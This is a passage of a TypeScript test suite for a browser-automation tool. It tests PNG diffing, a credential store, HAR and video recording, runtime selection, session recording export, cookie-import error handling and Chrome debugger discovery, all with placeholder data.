    try {
      await handleWriteCommand('emulate', ['nonexistent-device-xyz'], bm);
      expect(true).toBe(false);
    } catch (err: any) {
      expect(err.message).toContain('Unknown device');
    }
  });
});

// ─── PNG encoder roundtrip + generateDiffImage ───────────────────

describe('PNG encoder', () => {
  test('encodePNG produces valid PNG that roundtrips', () => {
    // Create a small 2x2 red image
    const img = { width: 2, height: 2, data: Buffer.alloc(16) };
    img.data[0] = 255; img.data[3] = 255; // pixel 0: red
    img.data[4] = 0; img.data[7] = 255;   // pixel 1: black
    img.data[8] = 0; img.data[11] = 255;  // pixel 2: black
    img.data[12] = 255; img.data[15] = 255; // pixel 3: red

    const encoded = encodePNG(img);
    expect(encoded[0]).toBe(137); // PNG magic
    expect(encoded[1]).toBe(80);  // P

    const decoded = decodePNG(encoded);
    expect(decoded.width).toBe(2);
    expect(decoded.height).toBe(2);
    // Check pixels match
    for (let i = 0; i < 16; i++) {
      expect(decoded.data[i]).toBe(img.data[i]);
    }
  });

  test('generateDiffImage returns valid PNG with red highlights', () => {
    const base = { width: 2, height: 1, data: Buffer.from([255, 0, 0, 255, 0, 255, 0, 255]) };
    const curr = { width: 2, height: 1, data: Buffer.from([255, 0, 0, 255, 0, 0, 255, 255]) };
    const diff = generateDiffImage(base, curr, 30);
    expect(diff[0]).toBe(137); // valid PNG
    const decoded = decodePNG(diff);
    expect(decoded.width).toBe(2);
    expect(decoded.height).toBe(1);
    // First pixel matches — should be dimmed
    expect(decoded.data[0]).toBeLessThan(255); // dimmed red
    // Second pixel differs — should be bright red
    expect(decoded.data[4]).toBe(255); // red channel = 255
  });
});

// ─── Auth commands via handler ───────────────────────────────────

describe('Auth commands via handler', () => {
  const tmpDir = '/tmp/browse-test-auth-handler';

  beforeAll(() => {
    process.env.BROWSE_ENCRYPTION_KEY = 'b'.repeat(64);
    process.env.BROWSE_LOCAL_DIR = tmpDir;
    fs.mkdirSync(tmpDir, { recursive: true });
  });

  afterAll(() => {
    delete process.env.BROWSE_ENCRYPTION_KEY;
    delete process.env.BROWSE_LOCAL_DIR;
    try { fs.rmSync(tmpDir, { recursive: true }); } catch {}
    // Also clean up /tmp/auth if handleMetaCommand used the module-level LOCAL_DIR
    try { fs.unlinkSync('/tmp/auth/testhandler.json'); } catch {}
  });

  test('auth save, list, delete roundtrip', async () => {
    const shutdown = async () => {};
    const saveResult = await handleMetaCommand('auth', ['save', 'testhandler', 'https://example.com', 'user', 'pass123'], bm, shutdown);
    expect(saveResult).toContain('Credentials saved');

    const listResult = await handleMetaCommand('auth', ['list'], bm, shutdown);
    expect(listResult).toContain('testhandler');
    expect(listResult).not.toContain('pass123');

    const deleteResult = await handleMetaCommand('auth', ['delete', 'testhandler'], bm, shutdown);
    expect(deleteResult).toContain('Credentials deleted');
  });
});

// ─── HAR recording via handler ───────────────────────────────────

describe('HAR recording via handler', () => {
  test('har start, navigate, har stop produces file', async () => {
    const shutdown = async () => {};
    await handleMetaCommand('har', ['start'], bm, shutdown);
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    const result = await handleMetaCommand('har', ['stop', '/tmp/browse-test-har.har'], bm, shutdown);
    expect(result).toContain('HAR saved');
    const har = JSON.parse(fs.readFileSync('/tmp/browse-test-har.har', 'utf-8'));
    expect(har.log.version).toBe('1.2');
    expect(har.log.entries.length).toBeGreaterThan(0);
    fs.unlinkSync('/tmp/browse-test-har.har');
  });

  test('har stop without start throws', async () => {
    const shutdown = async () => {};
    try {
      await handleMetaCommand('har', ['stop'], bm, shutdown);
      expect(true).toBe(false);
    } catch (err: any) {
      expect(err.message).toContain('No active HAR');
    }
  });
});

// ─── diff command ────────────────────────────────────────────────

describe('diff command', () => {
  test('diff between same URL shows no changes', async () => {
    const shutdown = async () => {};
    const result = await handleMetaCommand('diff', [baseUrl + '/basic.html', baseUrl + '/basic.html'], bm, shutdown);
    expect(result).toContain('---');
    expect(result).toContain('+++');
    // Same URL = no + or - lines (only space-prefixed)
    const lines = result.split('\n').filter(l => l.startsWith('+') || l.startsWith('-'));
    // Only the header lines start with +/-, content lines should match
    expect(lines.length).toBeLessThanOrEqual(2); // just the --- and +++ headers
  });
});

// ─── Video Recording ─────────────────────────────────────────

describe('Video Recording', () => {
  let videoDir: string;

  beforeAll(async () => {
    videoDir = fs.mkdtempSync(path.join(os.tmpdir(), 'browse-video-test-'));
    // Ensure we start from a known page
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
  });

  afterAll(async () => {
    // Stop recording if still active (defensive cleanup)
    try { await bm.stopVideoRecording(); } catch {}
    // Reset emulation if changed
    try { await handleWriteCommand('emulate', ['reset'], bm); } catch {}
    // Clean up temp directory
    try { fs.rmSync(videoDir, { recursive: true, force: true }); } catch {}
  });

  test('start recording, navigate, stop produces WebM files', async () => {
    const dir = path.join(videoDir, 'happy-path');
    await bm.startVideoRecording(dir);

    // Navigate to generate video content
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    // Small delay so the video codec captures at least one frame
    await Bun.sleep(500);

    const result = await bm.stopVideoRecording();
    expect(result).not.toBeNull();
    expect(result!.paths.length).toBeGreaterThan(0);
    expect(result!.dir).toBe(dir);
    for (const p of result!.paths) {
      expect(fs.existsSync(p)).toBe(true);
      expect(fs.statSync(p).size).toBeGreaterThan(0);
    }
  }, 30000);

  test('status: active while recording, inactive after stop', async () => {
    const dir = path.join(videoDir, 'status-check');
    expect(bm.getVideoRecording()).toBeNull();

    await bm.startVideoRecording(dir);
    const recording = bm.getVideoRecording();
    expect(recording).not.toBeNull();
    expect(recording!.dir).toBe(dir);
    expect(recording!.startedAt).toBeGreaterThan(0);

    await bm.stopVideoRecording();
    expect(bm.getVideoRecording()).toBeNull();
  }, 30000);

  test('double start throws "already active"', async () => {
    const dir = path.join(videoDir, 'double-start');
    await bm.startVideoRecording(dir);

    try {
      await bm.startVideoRecording(path.join(videoDir, 'double-start-2'));
      expect(true).toBe(false); // should not reach
    } catch (err: any) {
      expect(err.message).toContain('already active');
    }

    await bm.stopVideoRecording();
  }, 30000);

  test('stop without start returns null', async () => {
    // Ensure no recording is active
    expect(bm.getVideoRecording()).toBeNull();
    const result = await bm.stopVideoRecording();
    expect(result).toBeNull();
  });

  test('screenshot works during recording', async () => {
    const dir = path.join(videoDir, 'screenshot-during');
    await bm.startVideoRecording(dir);
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);

    const screenshotPath = path.join(videoDir, 'during-recording.png');
    const result = await handleMetaCommand('screenshot', [screenshotPath], bm, async () => {});
    expect(result).toContain('Screenshot saved');
    expect(fs.existsSync(screenshotPath)).toBe(true);
    expect(fs.statSync(screenshotPath).size).toBeGreaterThan(0);

    await bm.stopVideoRecording();
  }, 30000);

  test('emulate during recording keeps recording active and produces video', async () => {
    const dir = path.join(videoDir, 'emulate-during');
    await bm.startVideoRecording(dir);
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);

    // Emulate a device -- this recreates the context
    await handleWriteCommand('emulate', ['iPhone 15'], bm);

    // Recording should still be active (auto-injected via recreateContext)
    const recording = bm.getVideoRecording();
    expect(recording).not.toBeNull();
    expect(recording!.dir).toBe(dir);

    await Bun.sleep(300);
    const result = await bm.stopVideoRecording();
    expect(result).not.toBeNull();
    expect(result!.paths.length).toBeGreaterThan(0);
    for (const p of result!.paths) {
      expect(fs.existsSync(p)).toBe(true);
      expect(fs.statSync(p).size).toBeGreaterThan(0);
    }
    // Reset to desktop for subsequent tests
    await handleWriteCommand('emulate', ['reset'], bm);
  }, 30000);

  test('video command handler: start, status, stop via handleMetaCommand', async () => {
    const dir = path.join(videoDir, 'meta-handler');

    const startResult = await handleMetaCommand('video', ['start', dir], bm, async () => {});
    expect(startResult).toContain('Video recording started');
    expect(startResult).toContain(dir);

    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);

    const statusResult = await handleMetaCommand('video', ['status'], bm, async () => {});
    expect(statusResult).toContain('active');
    expect(statusResult).toContain(dir);

    await Bun.sleep(300);
    const stopResult = await handleMetaCommand('video', ['stop'], bm, async () => {});
    expect(stopResult).toContain('Video saved');
    expect(stopResult).toContain('.webm');
    expect(stopResult).toMatch(/\d+\.\d+s/); // duration like "1.2s"

    // Status should now show inactive
    const afterStatus = await handleMetaCommand('video', ['status'], bm, async () => {});
    expect(afterStatus).toContain('No active');
  }, 30000);

  test('video stop via handler throws when not recording', async () => {
    try {
      await handleMetaCommand('video', ['stop'], bm, async () => {});
      expect(true).toBe(false); // should not reach
    } catch (err: any) {
      expect(err.message).toContain('No active video recording');
    }
  });

  test('video files use tab-N.webm naming convention', async () => {
    const dir = path.join(videoDir, 'naming');
    await bm.startVideoRecording(dir);
    await handleWriteCommand('goto', [baseUrl + '/basic.html'], bm);
    await Bun.sleep(300);

    const result = await bm.stopVideoRecording();
    expect(result).not.toBeNull();
    // Should have at least one file named tab-N.webm
    expect(result!.paths.some(p => /tab-\d+\.webm$/.test(p))).toBe(true);
  }, 30000);
});

// ─── Runtime registry ────────────────────────────────────────────

import { getRuntime, AVAILABLE_RUNTIMES, findLightpanda } from '../src/runtime';

describe('Runtime registry', () => {
  test('getRuntime() defaults to playwright', async () => {
    const runtime = await getRuntime();
    expect(runtime.name).toBe('playwright');
    expect(runtime.chromium).toBeTruthy();
  });

  test('getRuntime("playwright") returns playwright', async () => {
    const runtime = await getRuntime('playwright');
    expect(runtime.name).toBe('playwright');
    expect(runtime.chromium).toBeTruthy();
  });

  test('getRuntime("invalid") throws with available runtimes', async () => {
    await expect(getRuntime('invalid')).rejects.toThrow('Unknown runtime: invalid');
  });

  test('AVAILABLE_RUNTIMES lists all runtimes', () => {
    expect(AVAILABLE_RUNTIMES).toContain('playwright');
    expect(AVAILABLE_RUNTIMES).toContain('rebrowser');
    expect(AVAILABLE_RUNTIMES).toContain('lightpanda');
  });

  test('findLightpanda returns null or valid path', () => {
    const result = findLightpanda();
    // Either null (not installed) or a string path
    if (result !== null) {
      expect(typeof result).toBe('string');
    }
  });

  test('getRuntime("rebrowser") throws install instructions when not installed', async () => {
    try {
      await getRuntime('rebrowser');
      // If it succeeds, rebrowser-playwright is installed -- just verify the runtime
    } catch (e: any) {
      expect(e.message).toContain('rebrowser-playwright not installed');
    }
  });
});

// ─── Record & Export ─────────────────────────────────────────────

import { SessionBuffers } from '../src/buffers';
import { exportBrowse, exportReplay } from '../src/record-export';
import type { RecordedStep } from '../src/record-export';
import type { Session } from '../src/session-manager';

describe('Record & Export', () => {
  const shutdown = async () => {};

  function makeSession(): Session {
    return {
      id: 'test-record',
      manager: bm,
      buffers: new SessionBuffers(),
      domainFilter: null,
      recording: null,
      outputDir: '/tmp',
      lastActivity: Date.now(),
      createdAt: Date.now(),
    };
  }

  // ─── record start/stop/status via handleMetaCommand ───────────

  test('record start sets recording active', async () => {
    const session = makeSession();
    const result = await handleMetaCommand('record', ['start'], bm, shutdown, undefined, session);
    expect(result).toContain('Recording started');

    const status = await handleMetaCommand('record', ['status'], bm, shutdown, undefined, session);
    expect(status).toContain('Recording active');
    // Cleanup
    session.recording = null;
  });

  test('record stop returns step count', async () => {
    const session = makeSession();
    await handleMetaCommand('record', ['start'], bm, shutdown, undefined, session);

    // Simulate steps that server.ts would push during command execution
    session.recording!.push(
      { command: 'goto', args: ['https://example.com'], timestamp: Date.now() },
      { command: 'click', args: ['.btn'], timestamp: Date.now() + 1 },
      { command: 'fill', args: ['#email', 'user@test.com'], timestamp: Date.now() + 2 },
    );

    const result = await handleMetaCommand('record', ['stop'], bm, shutdown, undefined, session);
    expect(result).toContain('3 steps');
  });

  test('record start while recording throws', async () => {
    const session = makeSession();
    await handleMetaCommand('record', ['start'], bm, shutdown, undefined, session);

    try {
      await handleMetaCommand('record', ['start'], bm, shutdown, undefined, session);
      expect(true).toBe(false); // should not reach
    } catch (err: any) {
      expect(err.message).toContain('already active');
    }
    // Cleanup
    session.recording = null;
  });

  test('record export with no recording throws', async () => {
    const session = makeSession();
    try {
      await handleMetaCommand('record', ['export', 'browse'], bm, shutdown, undefined, session);
      expect(true).toBe(false); // should not reach
    } catch (err: any) {
      expect(err.message).toContain('No recording to export');
    }
  });

  test('record status when inactive', async () => {
    const session = makeSession();
    const result = await handleMetaCommand('record', ['status'], bm, shutdown, undefined, session);
    expect(result).toContain('No active recording');
  });

  // ─── exportBrowse ──────────────────────────────────────────────

  test('exportBrowse produces chain-compatible output', () => {
    const steps: RecordedStep[] = [
      { command: 'goto', args: ['https://example.com'], timestamp: 1 },
      { command: 'click', args: ['.btn'], timestamp: 2 },
    ];
    const output = exportBrowse(steps);
    const parsed = JSON.parse(output);
    expect(parsed).toEqual([
      ['goto', 'https://example.com'],
      ['click', '.btn'],
    ]);
  });

  // ─── exportReplay ─────────────────────────────────────────────

  test('exportReplay produces Chrome DevTools Recorder format', () => {
    const steps: RecordedStep[] = [
      { command: 'goto', args: ['https://example.com'], timestamp: 1 },
      { command: 'click', args: ['.submit'], timestamp: 2 },
      { command: 'fill', args: ['#email', 'user@test.com'], timestamp: 3 },
    ];
    const output = exportReplay(steps);
    const parsed = JSON.parse(output);
    expect(parsed.title).toBe('browse recording');
    expect(parsed.steps).toBeInstanceOf(Array);
    // First step is setViewport (default)
    expect(parsed.steps[0].type).toBe('setViewport');
    // Navigate
    expect(parsed.steps[1].type).toBe('navigate');
    expect(parsed.steps[1].url).toBe('https://example.com');
    // Click
    expect(parsed.steps[2].type).toBe('click');
    expect(parsed.steps[2].selectors[0][0]).toBe('.submit');
    // Fill → change
    expect(parsed.steps[3].type).toBe('change');
    expect(parsed.steps[3].selectors[0][0]).toBe('#email');
    expect(parsed.steps[3].value).toBe('user@test.com');
  });

  test('exportReplay skips unmapped commands', () => {
    const steps: RecordedStep[] = [
      { command: 'goto', args: ['https://example.com'], timestamp: 1 },
      { command: 'snapshot', args: ['-i'], timestamp: 2 },
    ];
    const output = exportReplay(steps);
    const parsed = JSON.parse(output);
    // setViewport + navigate = 2 steps, snapshot is skipped
    expect(parsed.steps.length).toBe(2);
  });

  test('exportReplay handles back/forward', () => {
    const steps: RecordedStep[] = [
      { command: 'back', args: [], timestamp: 1 },
    ];
    const output = exportReplay(steps);
    const parsed = JSON.parse(output);
    // setViewport + back = 2 steps
    expect(parsed.steps[1].type).toBe('waitForExpression');
    expect(parsed.steps[1].expression).toContain('history.back()');
  });
});

// ─── Cookie Import ───────────────────────────────────────────────

describe('Cookie Import', () => {
  test('findInstalledBrowsers returns an array', () => {
    const browsers = findInstalledBrowsers();
    expect(Array.isArray(browsers)).toBe(true);
    // May be empty on CI, but should never throw
  });

  test('findInstalledBrowsers entries have correct structure', () => {
    const browsers = findInstalledBrowsers();
    for (const b of browsers) {
      expect(typeof b.name).toBe('string');
      expect(b.name.length).toBeGreaterThan(0);
      expect(Array.isArray(b.aliases)).toBe(true);
      expect(b.aliases.length).toBeGreaterThan(0);
      expect(typeof b.dataDir).toBe('string');
      expect(typeof b.keychainService).toBe('string');
    }
  });

  test('CookieImportError has code and action fields', () => {
    const err = new CookieImportError('test message', 'test_code', 'retry');
    expect(err).toBeInstanceOf(Error);
    expect(err).toBeInstanceOf(CookieImportError);
    expect(err.message).toBe('test message');
    expect(err.code).toBe('test_code');
    expect(err.action).toBe('retry');
    expect(err.name).toBe('CookieImportError');
  });

  test('CookieImportError without action field', () => {
    const err = new CookieImportError('no action', 'some_code');
    expect(err.code).toBe('some_code');
    expect(err.action).toBeUndefined();
  });

  test('CookieImportError is catchable as Error', () => {
    let caught = false;
    try {
      throw new CookieImportError('thrown', 'thrown_code');
    } catch (e) {
      if (e instanceof Error) {
        caught = true;
        expect(e.message).toBe('thrown');
      }
    }
    expect(caught).toBe(true);
  });
});

// ─── Chrome Discovery ────────────────────────────────────────────

describe('Chrome Discovery', () => {
  test('discoverChrome returns null or a string URL', async () => {
    const result = await discoverChrome();
    // In test env, there is typically no Chrome with debugging enabled
    // Result should be null (no Chrome) or a valid ws:// URL
    if (result !== null) {
      expect(typeof result).toBe('string');
      expect(result).toMatch(/^ws:\/\//);
    } else {
      expect(result).toBeNull();
    }
  }, 10_000);

  test('discoverChrome does not hang', async () => {
    // Verify the function completes within a reasonable time
    const start = Date.now();
    await discoverChrome();
    const elapsed = Date.now() - start;
    // Should complete well within 10s (timeout per probe is 2s, max ~4 probes)
    expect(elapsed).toBeLessThan(10_000);
  }, 10_000);
});
